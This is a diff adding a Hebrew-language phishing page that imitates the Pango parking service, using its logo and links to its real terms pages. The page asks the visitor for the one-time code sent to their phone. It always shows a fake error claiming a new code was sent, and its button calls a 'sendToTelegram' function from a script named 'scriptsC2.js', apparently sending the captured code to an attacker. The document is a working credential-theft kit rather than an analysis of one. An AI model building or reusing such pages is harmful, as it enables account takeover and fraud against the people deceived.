@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>דף הזנת קוד</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f9f9f9;
+            margin: 0;
+            padding: 0;
+        }
+        .logo {
+            text-align: left;
+            padding: 20px;
+            margin: 0;
+        }
+        .logo img {
+            width: 100px;
+            cursor: pointer;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 50px;
+        }
+        .message {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .error-message {
+            font-size: 14px;
+            color: red;
+            margin-top: 10px;
+            visibility: visible;
+        }
+        .icon img {
+            width: 150px;
+            margin-bottom: 10px;
+        }
+        .code-input {
+            width: 40%;
+            padding: 8px;
+            font-size: 16px;
+            text-align: center;
+            margin: 5px auto;
+            border: 1px solid #ccc;
+            border-radius: 20px;
+        }
+        .btn {
+            display: block;
+            width: 45%;
+            padding: 8px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            margin: 20px auto;
+        }
+        .btn:hover {
+            background-color: #0056b3;
+        }
+        .links {
+            margin-top: 20px;
+        }
+        .links a {
+            display: block;
+            color: #007bff;
+            text-decoration: none;
+            margin: 5px 0;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <a href="https://www.pango.co.il/" target="_blank">
+            <img src="img/logopango.png" alt="Pango Logo">
+        </a>
+    </div>
+    <div class="container">
+        <div class="message">הקוד נשלח לטלפון הנייד שלך</div>
+        <div class="icon">
+            <img src="img/897acc98-76fe-43f4-ac60-be16e1662e56.jpg" alt="Lock Icon">
+        </div>
+        <input id="codeInput" type="text" class="code-input" placeholder="הזן את הקוד">
+        <div id="errorMessage" class="error-message">אירעה שגיאה: קוד חדש נשלח</div>
+        <button class="btn" onclick="sendToTelegram()">המשך</button>
+        <div class="links">
+            <a href="https://www.pango.co.il/terms-of-use">תנאי שימוש פנגו</a>
+            <a href="https://www.pango.co.il/services_remove_options">אפשרות להסרת השירותים</a>
+        </div>
+    </div>
+
+    <script src="scriptsC2.js"></script>
+</body>
+</html>
